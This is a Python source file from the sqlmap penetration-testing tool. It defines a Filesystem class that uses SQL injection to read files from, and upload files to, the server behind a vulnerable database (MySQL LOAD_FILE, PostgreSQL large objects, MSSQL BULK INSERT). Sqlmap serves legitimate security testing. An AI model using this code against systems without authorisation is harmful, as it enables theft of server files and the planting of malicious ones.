#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import codecs
import os

from lib.core.agent import agent
from lib.core.common import dataToOutFile
from lib.core.common import Backend
from lib.core.common import isNumPosStrValue
from lib.core.common import isListLike
from lib.core.common import isTechniqueAvailable
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.convert import hexdecode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapUndefinedMethod
from lib.request import inject

class Filesystem:
    """
    This class defines generic OS file system functionalities for plugins.
    """

    def __init__(self):
        self.fileTblName = "sqlmapfile"
        self.tblField = "data"

    def _unhexString(self, hexStr):
        if len(hexStr) % 2 != 0:
            errMsg = "for some reason(s) sqlmap retrieved an odd-length "
            errMsg += "hexadecimal string which it is not able to convert "
            errMsg += "to raw string"
            logger.error(errMsg)

            return hexStr

        try:
            cleanStr = hexdecode(hexStr)
        except TypeError, e:
            logger.critical("unable to unhex the string ('%s')" % e)
            return None

        return cleanStr

    def _checkWrittenFile(self, wFile, dFile, fileType):
        if Backend.isDbms(DBMS.MYSQL):
            lengthQuery = "SELECT LENGTH(LOAD_FILE('%s'))" % dFile

        elif Backend.isDbms(DBMS.PGSQL):
            lengthQuery = "SELECT LENGTH(data) FROM pg_largeobject WHERE loid=%d" % self.oid

        elif Backend.isDbms(DBMS.MSSQL):
            self.createSupportTbl(self.fileTblName, self.tblField, "text")

            # Reference: http://msdn.microsoft.com/en-us/library/ms188365.aspx
            inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.fileTblName, dFile, randomStr(10), randomStr(10)))

            lengthQuery = "SELECT DATALENGTH(%s) FROM %s" % (self.tblField, self.fileTblName)

        wFileSize = os.path.getsize(wFile)

        logger.debug("checking if the %s file has been written" % fileType)
        dFileSize = inject.getValue(lengthQuery, resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
        sameFile = None

        if isNumPosStrValue(dFileSize):
            infoMsg = "the file has been successfully written and "
            infoMsg += "its size is %s bytes" % dFileSize

            dFileSize = long(dFileSize)

            if wFileSize == dFileSize:
                sameFile = True
                infoMsg += ", same size as the local file '%s'" % wFile
            else:
                sameFile = False
                infoMsg += ", but the size differs from the local "
                infoMsg += "file '%s' (%d bytes)" % (wFile, wFileSize)

            logger.info(infoMsg)
        else:
            sameFile = False
            warnMsg = "it looks like the file has not been written, this "
            warnMsg += "can occur if the DBMS process' user has no write "
            warnMsg += "privileges in the destination path"
            logger.warn(warnMsg)

        return sameFile

    def fileToSqlQueries(self, fcEncodedList):
        """
        Called by MySQL and PostgreSQL plugins to write a file on the
        back-end DBMS underlying file system
        """

        counter = 0
        sqlQueries = []

        for fcEncodedLine in fcEncodedList:
            if counter == 0:
                sqlQueries.append("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, fcEncodedLine))
            else:
                updatedField = agent.simpleConcatQuery(self.tblField, fcEncodedLine)
                sqlQueries.append("UPDATE %s SET %s=%s" % (self.fileTblName, self.tblField, updatedField))

            counter += 1

        return sqlQueries

    def fileEncode(self, fileName, encoding, single):
        """
        Called by MySQL and PostgreSQL plugins to write a file on the
        back-end DBMS underlying file system
        """

        retVal = []
        with codecs.open(fileName, "rb") as f:
            content = f.read().encode(encoding).replace("\n", "")

        if not single:
            if len(content) > 256:
                for i in xrange(0, len(content), 256):
                    _ = content[i:i+256]

                    if encoding == "hex":
                        _ = "0x%s" % _
                    elif encoding == "base64":
                        _ = "'%s'" % _

                    retVal.append(_)

        if not retVal:
            if encoding == "hex":
                content = "0x%s" % content
            elif encoding == "base64":
                content = "'%s'" % content

            retVal = [ content ]

        return retVal

    def askCheckWrittenFile(self, wFile, dFile, fileType):
        message = "do you want confirmation that the file '%s' " % dFile
        message += "has been successfully written on the back-end DBMS "
        message += "file system? [Y/n] "
        output = readInput(message, default="Y")

        if not output or output in ("y", "Y"):
            return self._checkWrittenFile(wFile, dFile, fileType)

        return True

    def nonStackedReadFile(self, rFile):
        errMsg = "'nonStackedReadFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod, errMsg

    def stackedReadFile(self, rFile):
        errMsg = "'stackedReadFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod, errMsg

    def unionWriteFile(self, wFile, dFile, fileType):
        errMsg = "'unionWriteFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod, errMsg

    def stackedWriteFile(self, wFile, dFile, fileType):
        errMsg = "'stackedWriteFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod, errMsg

    def readFile(self, rFile):
        fileContent = None

        self.checkDbmsOs()

        kb.fileReadMode = True

        if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
            if isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
                debugMsg = "going to read the file with stacked query SQL "
                debugMsg += "injection technique"
                logger.debug(debugMsg)

            fileContent = self.stackedReadFile(rFile)
        elif Backend.isDbms(DBMS.MYSQL):
            debugMsg = "going to read the file with a non-stacked query "
            debugMsg += "SQL injection technique"
            logger.debug(debugMsg)

            fileContent = self.nonStackedReadFile(rFile)
        else:
            errMsg = "none of the SQL injection techniques detected can "
            errMsg += "be used to read files from the underlying file "
            errMsg += "system of the back-end %s server" % Backend.getDbms()
            logger.error(errMsg)

            return None

        kb.fileReadMode = False

        if fileContent in ( None, "" ) and not Backend.isDbms(DBMS.PGSQL):
            self.cleanup(onlyFileTbl=True)

            return
        elif isListLike(fileContent):
            newFileContent = ""

            for chunk in fileContent:
                if isListLike(chunk):
                    if len(chunk) > 0:
                        chunk = chunk[0]
                    else:
                        chunk = ""

                if chunk:
                    newFileContent += chunk

            fileContent = newFileContent

        fileContent = self._unhexString(fileContent)
        rFilePath = dataToOutFile(fileContent)

        if not Backend.isDbms(DBMS.PGSQL):
            self.cleanup(onlyFileTbl=True)

        return rFilePath

    def writeFile(self, wFile, dFile, fileType=None):
        self.checkDbmsOs()

        if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
            if isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
                debugMsg = "going to upload the %s file with " % fileType
                debugMsg += "stacked query SQL injection technique"
                logger.debug(debugMsg)

            self.stackedWriteFile(wFile, dFile, fileType)
            self.cleanup(onlyFileTbl=True)
        elif isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and Backend.isDbms(DBMS.MYSQL):
            debugMsg = "going to upload the %s file with " % fileType
            debugMsg += "UNION query SQL injection technique"
            logger.debug(debugMsg)

            self.unionWriteFile(wFile, dFile, fileType)
        else:
            errMsg = "none of the SQL injection techniques detected can "
            errMsg += "be used to write files to the underlying file "
            errMsg += "system of the back-end %s server" % Backend.getDbms()
            logger.error(errMsg)

            return None
